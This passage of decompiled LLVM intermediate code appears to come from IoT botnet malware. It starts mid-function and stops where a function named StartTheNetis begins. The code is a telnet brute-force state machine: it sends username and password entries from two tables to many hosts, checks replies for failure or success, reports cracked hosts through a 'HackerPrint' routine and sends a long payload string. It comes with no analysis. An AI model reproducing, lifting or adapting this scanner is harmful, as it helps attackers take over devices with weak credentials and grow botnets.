  store i8 0, i8* %v3_ed30, align 4
  store i32 %v2_ed28, i32* %r2.global-to-local, align 4
  %v3_ed58 = add i32 %v2_e27c, 9
  %v4_ed58 = inttoptr i32 %v3_ed58 to i8*
  store i8 1, i8* %v4_ed58, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_ed60:                                ; preds = %dec_label_pc_e2c8
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_ed78 = inttoptr i32 %v2_e27c to i32*
  %v2_ed78 = load i32, i32* %v1_ed78, align 4
  store i32 %v2_ed78, i32* @r4, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_ed98 = add i32 %v2_e27c, 8
  %v1_ed9c = add i32 %v2_e27c, 10
  %v2_ed9c = inttoptr i32 %v1_ed9c to i8*
  %v3_ed9c = load i8, i8* %v2_ed9c, align 2
  %v4_ed9c = zext i8 %v3_ed9c to i32
  store i32 %v4_ed9c, i32* %r2.global-to-local, align 4
  %v4_eda8 = mul nuw nsw i32 %v4_ed9c, 4
  %v5_eda8 = add i32 %v4_eda8, ptrtoint ([45 x i8*]* @global_var_320ec.529 to i32)
  %v6_eda8 = inttoptr i32 %v5_eda8 to i32*
  %v7_eda8 = load i32, i32* %v6_eda8, align 4
  store i32 %v7_eda8, i32* @r5, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v3_edcc = load i8, i8* %v2_ed9c, align 2
  %v4_edcc = zext i8 %v3_edcc to i32
  store i32 %v4_edcc, i32* %r2.global-to-local, align 4
  %v4_edd8 = mul nuw nsw i32 %v4_edcc, 4
  %v5_edd8 = add i32 %v4_edd8, ptrtoint ([45 x i8*]* @global_var_320ec.529 to i32)
  %v6_edd8 = inttoptr i32 %v5_edd8 to i32*
  %v7_edd8 = load i32, i32* %v6_edd8, align 4
  %v1_eddc = inttoptr i32 %v7_edd8 to i8*
  %v3_ede0 = call i32 @strlen(i8* %v1_eddc)
  %v0_ede8 = load i32, i32* @r4, align 4
  %v0_edec = load i32, i32* @r5, align 4
  store i32 %v3_ede0, i32* %r2.global-to-local, align 4
  %v4_edf8 = call i32 @__libc_send(i32 %v0_ede8, i32 %v0_edec, i32 %v3_ede0, i32 16384)
  %v1_ee00 = icmp slt i32 %v4_edf8, 0
  br i1 %v1_ee00, label %dec_label_pc_ee08, label %dec_label_pc_ee5c

dec_label_pc_ee08:                                ; preds = %dec_label_pc_ed60
  %v3_ee2c = inttoptr i32 %v2_ed98 to i8*
  store i8 0, i8* %v3_ee2c, align 4
  store i32 %v2_ed98, i32* %r2.global-to-local, align 4
  %v3_ee54 = add i32 %v2_e27c, 9
  %v4_ee54 = inttoptr i32 %v3_ee54 to i8*
  store i8 1, i8* %v4_ee54, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_ee5c:                                ; preds = %dec_label_pc_ed60
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_ee74 = load i32, i32* %v1_ed78, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_ee88 = call i32 @__libc_send(i32 %v2_ee74, i32 ptrtoint ([3 x i8]* @global_var_246b4.531 to i32), i32 2, i32 16384)
  %v1_ee90 = icmp slt i32 %v5_ee88, 0
  store i32 %v2_ed98, i32* %r2.global-to-local, align 4
  br i1 %v1_ee90, label %dec_label_pc_ee98, label %dec_label_pc_eeec

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee5c
  %v3_eebc = inttoptr i32 %v2_ed98 to i8*
  store i8 0, i8* %v3_eebc, align 4
  store i32 %v2_ed98, i32* %r2.global-to-local, align 4
  %v3_eee4 = add i32 %v2_e27c, 9
  %v4_eee4 = inttoptr i32 %v3_eee4 to i8*
  store i8 1, i8* %v4_eee4, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_eeec:                                ; preds = %dec_label_pc_ee5c
  %v3_ef10 = inttoptr i32 %v2_ed98 to i8*
  store i8 4, i8* %v3_ef10, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_ef18:                                ; preds = %dec_label_pc_e2c8
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_ef30 = inttoptr i32 %v2_e27c to i32*
  %v2_ef30 = load i32, i32* %v1_ef30, align 4
  store i32 %v2_ef30, i32* %ip.global-to-local, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_ef50 = add i32 %v2_e278, %v2_ea5c
  %v1_ef54 = inttoptr i32 %v2_ef50 to i32*
  %v2_ef54 = load i32, i32* %v1_ef54, align 4
  store i32 %v2_ef54, i32* %r2.global-to-local, align 4
  %v1_ef5c = load i32, i32* @sp, align 4
  %v2_ef5c = inttoptr i32 %v1_ef5c to i32*
  store i32 ptrtoint (i32* @global_var_321a0 to i32), i32* %v2_ef5c, align 4
  %v0_ef60 = load i32, i32* %ip.global-to-local, align 4
  %v4_ef6c = inttoptr i32 %v2_ef54 to i8*
  %v5_ef6c = call i32 @read_until_response(i32 %v0_ef60, i32 10, i8* %v4_ef6c, i32 1024)
  %v2_ef74 = icmp eq i32 %v5_ef6c, 0
  br i1 %v2_ef74, label %dec_label_pc_f00c, label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %dec_label_pc_ef18
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_ef9c = load i32, i32* %v1_ef54, align 4
  %v3_efa4 = call i32 @contains_fail(i32 %v2_ef9c, i32 %v3_e180, i32 %v3_e270)
  %v2_efac = icmp eq i32 %v3_efa4, 0
  %v2_effc = add i32 %v2_e27c, 8
  store i32 %v2_effc, i32* %r2.global-to-local, align 4
  br i1 %v2_efac, label %dec_label_pc_efe0, label %dec_label_pc_efb4

dec_label_pc_efb4:                                ; preds = %dec_label_pc_ef7c
  %v3_efd8 = inttoptr i32 %v2_effc to i8*
  store i8 0, i8* %v3_efd8, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_efe0:                                ; preds = %dec_label_pc_ef7c
  %v3_f004 = inttoptr i32 %v2_effc to i8*
  store i8 5, i8* %v3_f004, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_f00c:                                ; preds = %dec_label_pc_ef18
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_f02c = load i32, i32* %v1_e284, align 4
  %v1_f030 = add i32 %v2_f02c, 6
  store i32 %v1_f030, i32* @r4, align 4
  %v2_f038 = call i32 @__GI_time(i32* null)
  %v0_f040 = load i32, i32* @r4, align 4
  %v3_f040 = icmp ult i32 %v0_f040, %v2_f038
  br i1 %v3_f040, label %dec_label_pc_f048, label %dec_label_pc_f7f8

dec_label_pc_f048:                                ; preds = %dec_label_pc_f00c
  %v2_f064 = add i32 %v2_e27c, 8
  %v3_f06c = inttoptr i32 %v2_f064 to i8*
  store i8 0, i8* %v3_f06c, align 4
  store i32 %v2_f064, i32* %r2.global-to-local, align 4
  %v3_f094 = add i32 %v2_e27c, 9
  %v4_f094 = inttoptr i32 %v3_f094 to i8*
  store i8 1, i8* %v4_f094, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_f09c:                                ; preds = %dec_label_pc_e2c8
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_f0b4 = inttoptr i32 %v2_e27c to i32*
  %v2_f0b4 = load i32, i32* %v1_f0b4, align 4
  store i32 %v2_f0b4, i32* @r4, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_f0d4 = add i32 %v2_e27c, 8
  %v1_f0d8 = add i32 %v2_e27c, 11
  %v2_f0d8 = inttoptr i32 %v1_f0d8 to i8*
  %v3_f0d8 = load i8, i8* %v2_f0d8, align 1
  %v4_f0d8 = zext i8 %v3_f0d8 to i32
  store i32 %v4_f0d8, i32* %r2.global-to-local, align 4
  %v4_f0e4 = mul nuw nsw i32 %v4_f0d8, 4
  %v5_f0e4 = add i32 %v4_f0e4, ptrtoint ([23 x i8*]* @global_var_32144.533 to i32)
  %v6_f0e4 = inttoptr i32 %v5_f0e4 to i32*
  %v7_f0e4 = load i32, i32* %v6_f0e4, align 4
  store i32 %v7_f0e4, i32* @r5, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v3_f108 = load i8, i8* %v2_f0d8, align 1
  %v4_f108 = zext i8 %v3_f108 to i32
  store i32 %v4_f108, i32* %r2.global-to-local, align 4
  %v4_f114 = mul nuw nsw i32 %v4_f108, 4
  %v5_f114 = add i32 %v4_f114, ptrtoint ([23 x i8*]* @global_var_32144.533 to i32)
  %v6_f114 = inttoptr i32 %v5_f114 to i32*
  %v7_f114 = load i32, i32* %v6_f114, align 4
  %v1_f118 = inttoptr i32 %v7_f114 to i8*
  %v3_f11c = call i32 @strlen(i8* %v1_f118)
  %v0_f124 = load i32, i32* @r4, align 4
  %v0_f128 = load i32, i32* @r5, align 4
  store i32 %v3_f11c, i32* %r2.global-to-local, align 4
  %v4_f134 = call i32 @__libc_send(i32 %v0_f124, i32 %v0_f128, i32 %v3_f11c, i32 16384)
  %v1_f13c = icmp slt i32 %v4_f134, 0
  br i1 %v1_f13c, label %dec_label_pc_f144, label %dec_label_pc_f198

dec_label_pc_f144:                                ; preds = %dec_label_pc_f09c
  %v3_f168 = inttoptr i32 %v2_f0d4 to i8*
  store i8 0, i8* %v3_f168, align 4
  store i32 %v2_f0d4, i32* %r2.global-to-local, align 4
  %v3_f190 = add i32 %v2_e27c, 9
  %v4_f190 = inttoptr i32 %v3_f190 to i8*
  store i8 1, i8* %v4_f190, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_f198:                                ; preds = %dec_label_pc_f09c
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_f1b0 = load i32, i32* %v1_f0b4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_f1c4 = call i32 @__libc_send(i32 %v2_f1b0, i32 ptrtoint ([3 x i8]* @global_var_246b4.531 to i32), i32 2, i32 16384)
  %v1_f1cc = icmp slt i32 %v5_f1c4, 0
  store i32 %v2_f0d4, i32* %r2.global-to-local, align 4
  br i1 %v1_f1cc, label %dec_label_pc_f1d4, label %dec_label_pc_f228

dec_label_pc_f1d4:                                ; preds = %dec_label_pc_f198
  %v3_f1f8 = inttoptr i32 %v2_f0d4 to i8*
  store i8 0, i8* %v3_f1f8, align 4
  store i32 %v2_f0d4, i32* %r2.global-to-local, align 4
  %v3_f220 = add i32 %v2_e27c, 9
  %v4_f220 = inttoptr i32 %v3_f220 to i8*
  store i8 1, i8* %v4_f220, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_f228:                                ; preds = %dec_label_pc_f198
  %v3_f24c = inttoptr i32 %v2_f0d4 to i8*
  store i8 6, i8* %v3_f24c, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_f254:                                ; preds = %dec_label_pc_e2c8
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_f26c = inttoptr i32 %v2_e27c to i32*
  %v2_f26c = load i32, i32* %v1_f26c, align 4
  store i32 %v2_f26c, i32* %ip.global-to-local, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_f28c = add i32 %v2_e278, %v2_ea5c
  %v1_f290 = inttoptr i32 %v2_f28c to i32*
  %v2_f290 = load i32, i32* %v1_f290, align 4
  store i32 %v2_f290, i32* %r2.global-to-local, align 4
  %v1_f298 = load i32, i32* @sp, align 4
  %v2_f298 = inttoptr i32 %v1_f298 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_321e8.535 to i32), i32* %v2_f298, align 4
  %v0_f29c = load i32, i32* %ip.global-to-local, align 4
  %v4_f2a8 = inttoptr i32 %v2_f290 to i8*
  %v5_f2a8 = call i32 @read_until_response(i32 %v0_f29c, i32 10, i8* %v4_f2a8, i32 1024)
  %v2_f2b0 = icmp eq i32 %v5_f2a8, 0
  br i1 %v2_f2b0, label %dec_label_pc_f5ac, label %dec_label_pc_f2b8

dec_label_pc_f2b8:                                ; preds = %dec_label_pc_f254
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f2c0 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f2d4 = load i32, i32* @r4, align 4
  %v2_f2e0 = mul i32 %v0_f2d4, 28
  %v2_f2e8 = add i32 %v2_f5c4, %v2_f2e0
  %v2_f2ec = inttoptr i32 %v2_f2e8 to i32*
  store i32 %v2_f2c0, i32* %v2_f2ec, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_f30c = add i32 %v2_e27c, 24
  %v1_f310 = inttoptr i32 %v2_f30c to i32*
  %v2_f310 = load i32, i32* %v1_f310, align 4
  %v3_f318 = call i32 @contains_fail(i32 %v2_f310, i32 %v3_e180, i32 %v3_e270)
  %v2_f320 = icmp eq i32 %v3_f318, 0
  br i1 %v2_f320, label %dec_label_pc_f354, label %dec_label_pc_f328

dec_label_pc_f328:                                ; preds = %dec_label_pc_f2b8
  %v2_f344 = add i32 %v2_e27c, 8
  store i32 %v2_f344, i32* %r2.global-to-local, align 4
  %v3_f34c = inttoptr i32 %v2_f344 to i8*
  store i8 0, i8* %v3_f34c, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_f354:                                ; preds = %dec_label_pc_f2b8
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_f374 = load i32, i32* %v1_f310, align 4
  %v3_f37c = call i32 @contains_success(i32 %v2_f374, i32 %v3_e180, i32 %v3_e270)
  %v2_f384 = icmp eq i32 %v3_f37c, 0
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_f574 = add i32 %v2_e27c, 8
  br i1 %v2_f384, label %dec_label_pc_f558, label %dec_label_pc_f38c

dec_label_pc_f38c:                                ; preds = %dec_label_pc_f354
  %v1_f3ac = add i32 %v2_e27c, 9
  %v2_f3ac = inttoptr i32 %v1_f3ac to i8*
  %v3_f3ac = load i8, i8* %v2_f3ac, align 1
  %v7_f3b0 = icmp eq i8 %v3_f3ac, 2
  br i1 %v7_f3b0, label %dec_label_pc_f3b8, label %dec_label_pc_f3e4

dec_label_pc_f3b8:                                ; preds = %dec_label_pc_f38c
  store i32 %v2_f574, i32* %r2.global-to-local, align 4
  %v3_f3dc = inttoptr i32 %v2_f574 to i8*
  store i8 7, i8* %v3_f3dc, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_f3e4:                                ; preds = %dec_label_pc_f38c
  %v2_f3e8 = load i32, i32* @global_var_324c8.59, align 4
  store i32 %v2_f3e8, i32* @r4, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v3_f408 = call i32 @get_telstate_host(i32 %v2_e27c, i32 %v3_e180, i32 %v3_e270)
  store i32 %v3_f408, i32* %ip.global-to-local, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_f430 = add i32 %v2_e27c, 10
  %v2_f430 = inttoptr i32 %v1_f430 to i8*
  %v3_f430 = load i8, i8* %v2_f430, align 2
  %v4_f430 = zext i8 %v3_f430 to i32
  store i32 %v4_f430, i32* %r2.global-to-local, align 4
  %v4_f43c = mul nuw nsw i32 %v4_f430, 4
  %v5_f43c = add i32 %v4_f43c, ptrtoint ([45 x i8*]* @global_var_320ec.529 to i32)
  %v6_f43c = inttoptr i32 %v5_f43c to i32*
  %v7_f43c = load i32, i32* %v6_f43c, align 4
  store i32 %v7_f43c, i32* @lr, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_f460 = add i32 %v2_e27c, 11
  %v2_f460 = inttoptr i32 %v1_f460 to i8*
  %v3_f460 = load i8, i8* %v2_f460, align 1
  %v4_f460 = zext i8 %v3_f460 to i32
  store i32 %v4_f460, i32* %r2.global-to-local, align 4
  %v4_f46c = mul nuw nsw i32 %v4_f460, 4
  %v5_f46c = add i32 %v4_f46c, ptrtoint ([23 x i8*]* @global_var_32144.533 to i32)
  %v6_f46c = inttoptr i32 %v5_f46c to i32*
  %v7_f46c = load i32, i32* %v6_f46c, align 4
  %v1_f470 = load i32, i32* @sp, align 4
  %v2_f470 = inttoptr i32 %v1_f470 to i32*
  store i32 %v7_f46c, i32* %v2_f470, align 4
  %v0_f474 = load i32, i32* @r4, align 4
  %v0_f47c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f47c, i32* @r2, align 4
  %v2_f484 = call i32 @HackerPrint(i32 %v0_f474, i32 ptrtoint (i32* @global_var_246b8.538 to i32))
  %v2_f48c = load i32, i32* @global_var_324c8.59, align 4
  store i32 %v2_f48c, i32* @r4, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v3_f4ac = call i32 @get_telstate_host(i32 %v2_e27c, i32 %v3_e180, i32 %v3_e270)
  store i32 %v3_f4ac, i32* %ip.global-to-local, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v3_f4d4 = load i8, i8* %v2_f430, align 2
  %v4_f4d4 = zext i8 %v3_f4d4 to i32
  store i32 %v4_f4d4, i32* %r2.global-to-local, align 4
  %v4_f4e0 = mul nuw nsw i32 %v4_f4d4, 4
  %v5_f4e0 = add i32 %v4_f4e0, ptrtoint ([45 x i8*]* @global_var_320ec.529 to i32)
  %v6_f4e0 = inttoptr i32 %v5_f4e0 to i32*
  %v7_f4e0 = load i32, i32* %v6_f4e0, align 4
  store i32 %v7_f4e0, i32* @lr, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v3_f504 = load i8, i8* %v2_f460, align 1
  %v4_f504 = zext i8 %v3_f504 to i32
  store i32 %v4_f504, i32* %r2.global-to-local, align 4
  %v4_f510 = mul nuw nsw i32 %v4_f504, 4
  %v5_f510 = add i32 %v4_f510, ptrtoint ([23 x i8*]* @global_var_32144.533 to i32)
  %v6_f510 = inttoptr i32 %v5_f510 to i32*
  %v7_f510 = load i32, i32* %v6_f510, align 4
  %v1_f514 = load i32, i32* @sp, align 4
  %v2_f514 = inttoptr i32 %v1_f514 to i32*
  store i32 %v7_f510, i32* %v2_f514, align 4
  %v0_f518 = load i32, i32* @r4, align 4
  %v0_f520 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f520, i32* @r2, align 4
  %v3_f528 = call i32 @HackerPrint(i32 %v0_f518, i32 ptrtoint ([16 x i8]* @global_var_24724.540 to i32))
  store i32 %v2_f574, i32* %r2.global-to-local, align 4
  %v3_f550 = inttoptr i32 %v2_f574 to i8*
  store i8 7, i8* %v3_f550, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_f558:                                ; preds = %dec_label_pc_f354
  %v3_f57c = inttoptr i32 %v2_f574 to i8*
  store i8 0, i8* %v3_f57c, align 4
  store i32 %v2_f574, i32* %r2.global-to-local, align 4
  %v3_f5a4 = add i32 %v2_e27c, 9
  %v4_f5a4 = inttoptr i32 %v3_f5a4 to i8*
  store i8 1, i8* %v4_f5a4, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_f5ac:                                ; preds = %dec_label_pc_f254
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_f5c8 = add i32 %v2_e278, %v2_f5c4
  %v1_f5cc = inttoptr i32 %v2_f5c8 to i32*
  %v2_f5cc = load i32, i32* %v1_f5cc, align 4
  %v1_f5d0 = add i32 %v2_f5cc, 7
  store i32 %v1_f5d0, i32* @r4, align 4
  %v2_f5d8 = call i32 @__GI_time(i32* null)
  %v0_f5e0 = load i32, i32* @r4, align 4
  %v3_f5e0 = icmp ult i32 %v0_f5e0, %v2_f5d8
  br i1 %v3_f5e0, label %dec_label_pc_f5e8, label %dec_label_pc_f7f8

dec_label_pc_f5e8:                                ; preds = %dec_label_pc_f5ac
  %v2_f604 = add i32 %v2_e27c, 8
  %v3_f60c = inttoptr i32 %v2_f604 to i8*
  store i8 0, i8* %v3_f60c, align 4
  store i32 %v2_f604, i32* %r2.global-to-local, align 4
  %v3_f634 = add i32 %v2_e27c, 9
  %v4_f634 = inttoptr i32 %v3_f634 to i8*
  store i8 1, i8* %v4_f634, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_f63c:                                ; preds = %dec_label_pc_e2c8
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f644 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f658 = load i32, i32* @r4, align 4
  %v2_f664 = mul i32 %v0_f658, 28
  %v2_f66c = add i32 %v2_f5c4, %v2_f664
  %v2_f670 = inttoptr i32 %v2_f66c to i32*
  store i32 %v2_f644, i32* %v2_f670, align 4
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v1_f68c = inttoptr i32 %v2_e27c to i32*
  %v2_f68c = load i32, i32* %v1_f68c, align 4
  store i32 %v2_f68c, i32* @r4, align 4
  %v2_f694 = load i32, i32* bitcast ([703 x i8]** @global_var_3219c.542 to i32*), align 4
  store i32 %v2_f694, i32* @r5, align 4
  %v1_f6a0 = inttoptr i32 %v2_f694 to i8*
  %v3_f6a4 = call i32 @strlen(i8* %v1_f6a0)
  %v0_f6ac = load i32, i32* @r4, align 4
  %v0_f6b0 = load i32, i32* @r5, align 4
  store i32 %v3_f6a4, i32* %r2.global-to-local, align 4
  %v5_f6bc = call i32 @__libc_send(i32 %v0_f6ac, i32 %v0_f6b0, i32 %v3_f6a4, i32 16384)
  %v1_f6c4 = icmp slt i32 %v5_f6bc, 0
  store i32 %v3_e180, i32* @r1, align 4
  br i1 %v1_f6c4, label %dec_label_pc_f6cc, label %dec_label_pc_f744

dec_label_pc_f6cc:                                ; preds = %dec_label_pc_f63c
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_f6e4 = load i32, i32* %v1_f68c, align 4
  %v3_f6ec = call i32 @sclose(i32 %v2_f6e4, i32 %v3_e180, i32 %v3_e270)
  %v2_f70c = add i32 %v2_e27c, 8
  %v3_f714 = inttoptr i32 %v2_f70c to i8*
  store i8 0, i8* %v3_f714, align 4
  store i32 %v2_f70c, i32* %r2.global-to-local, align 4
  %v3_f73c = add i32 %v2_e27c, 9
  %v4_f73c = inttoptr i32 %v3_f73c to i8*
  store i8 1, i8* %v4_f73c, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_f744:                                ; preds = %dec_label_pc_f63c
  %v2_f760 = add i32 %v2_e27c, 8
  %v3_f768 = add i32 %v2_e27c, 9
  %v4_f768 = inttoptr i32 %v3_f768 to i8*
  store i8 3, i8* %v4_f768, align 1
  store i32 %v3_e270, i32* %r2.global-to-local, align 4
  %v2_f788 = add i32 %v2_e278, %v2_f5c4
  %v1_f78c = inttoptr i32 %v2_f788 to i32*
  %v2_f78c = load i32, i32* %v1_f78c, align 4
  %v1_f790 = add i32 %v2_f78c, 60
  store i32 %v1_f790, i32* @r4, align 4
  %v2_f798 = call i32 @__GI_time(i32* null)
  %v0_f7a0 = load i32, i32* @r4, align 4
  %v3_f7a0 = icmp ult i32 %v0_f7a0, %v2_f798
  br i1 %v3_f7a0, label %dec_label_pc_f7a8, label %dec_label_pc_f7f8

dec_label_pc_f7a8:                                ; preds = %dec_label_pc_f744
  %v3_f7cc = inttoptr i32 %v2_f760 to i8*
  store i8 0, i8* %v3_f7cc, align 4
  store i32 %v2_f760, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v4_f768, align 1
  br label %dec_label_pc_f7f8

dec_label_pc_f7f8:                                ; preds = %dec_label_pc_eb28, %dec_label_pc_ecd0, %dec_label_pc_f00c, %dec_label_pc_f5ac, %dec_label_pc_f744, %dec_label_pc_e2c8, %dec_label_pc_e57c, %dec_label_pc_f6cc, %dec_label_pc_f5e8, %dec_label_pc_f558, %dec_label_pc_f3e4, %dec_label_pc_f3b8, %dec_label_pc_f328, %dec_label_pc_f228, %dec_label_pc_f1d4, %dec_label_pc_f144, %dec_label_pc_f048, %dec_label_pc_efe0, %dec_label_pc_efb4, %dec_label_pc_eeec, %dec_label_pc_ee98, %dec_label_pc_ee08, %dec_label_pc_ed0c, %dec_label_pc_eca4, %dec_label_pc_ec78, %dec_label_pc_eb64, %dec_label_pc_eab0, %dec_label_pc_e994, %dec_label_pc_e91c, %dec_label_pc_e744, %dec_label_pc_e6f4, %dec_label_pc_e550, %dec_label_pc_e4f8, %dec_label_pc_f7a8
  %v1_f7fc = add nuw nsw i32 %storemerge612, 1
  %v5_f810 = icmp slt i32 %v1_f7fc, 1000
  br i1 %v5_f810, label %dec_label_pc_e264, label %dec_label_pc_e258

; uselistorder directives
  uselistorder i32 %v3_f6a4, { 1, 0 }
  uselistorder i32 %v2_f574, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v3_f11c, { 1, 0 }
  uselistorder i32 %v2_f0d4, { 5, 2, 4, 3, 0, 1 }
  uselistorder i32 %v2_effc, { 1, 0, 2 }
  uselistorder i32 %v3_ede0, { 1, 0 }
  uselistorder i32 %v2_ed98, { 5, 2, 4, 3, 0, 1 }
  uselistorder i32 %v2_ecc0, { 1, 0, 2 }
  uselistorder i32 %v2_e9ac, { 1, 0 }
  uselistorder i32* %v1_e7ec, { 4, 3, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 %storemerge711, { 1, 0 }
  uselistorder i32 %v0_e3d0, { 1, 0 }
  uselistorder i8* %v2_e338, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_e2ac, { 1, 0 }
  uselistorder i32* %v1_e284, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_e27c, { 4, 5, 49, 50, 51, 38, 39, 40, 46, 41, 42, 45, 44, 43, 3, 47, 48, 34, 33, 36, 35, 37, 29, 30, 31, 32, 25, 24, 27, 26, 28, 20, 21, 22, 23, 17, 18, 15, 16, 11, 12, 13, 14, 19, 7, 1, 2, 8, 0, 10, 9, 6 }
  uselistorder i32 %v2_e278, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_e270, { 66, 64, 65, 63, 49, 62, 61, 59, 60, 58, 57, 55, 56, 54, 52, 53, 50, 51, 48, 47, 46, 45, 44, 43, 40, 41, 42, 39, 38, 37, 36, 35, 34, 31, 32, 33, 30, 29, 27, 28, 26, 24, 25, 23, 22, 20, 21, 19, 18, 17, 16, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i32 %storemerge612, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_f5c4, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v2_e798, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_e240, { 1, 0, 2 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %v3_e180, { 3, 4, 8, 7, 6, 5, 9, 10, 15, 16, 13, 14, 11, 12, 17, 18, 0, 19, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-344, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 9, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 83, 73, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 74, 75, 76, 78, 77, 120, 79, 80, 81, 82 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 12, 13 }
  uselistorder i32 (i32, i32, i32)* @get_telstate_host, { 1, 0 }
  uselistorder i32 35, { 1, 0 }
  uselistorder i32 ptrtoint ([23 x i8*]* @global_var_32144.533 to i32), { 2, 3, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_246b4.531 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([45 x i8*]* @global_var_320ec.529 to i32), { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i32 5000, { 1, 0 }
  uselistorder label %dec_label_pc_f7f8, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_e7ac, { 1, 0 }
  uselistorder label %dec_label_pc_e744, { 1, 0 }
  uselistorder label %dec_label_pc_e2c8, { 1, 0 }
  uselistorder label %dec_label_pc_e264, { 1, 0 }
  uselistorder label %dec_label_pc_e1c4, { 1, 0 }
}

define i32 @StartTheNetis(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1076 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 63560, i32* %stack_var_-4, align 4
  %v2_f844 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f844, i32* @fp, align 4
  %v3_f8a8 = bitcast i32* %stack_var_-44 to i8*
  %v2_f8bc = ptrtoint i32* %stack_var_-1076 to i32
  %tmp17 = bitcast i32* %stack_var_-1076 to i8*
  %v2_f8e8 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_f84c

dec_label_pc_f84c:                                ; preds = %dec_label_pc_f84c, %entry
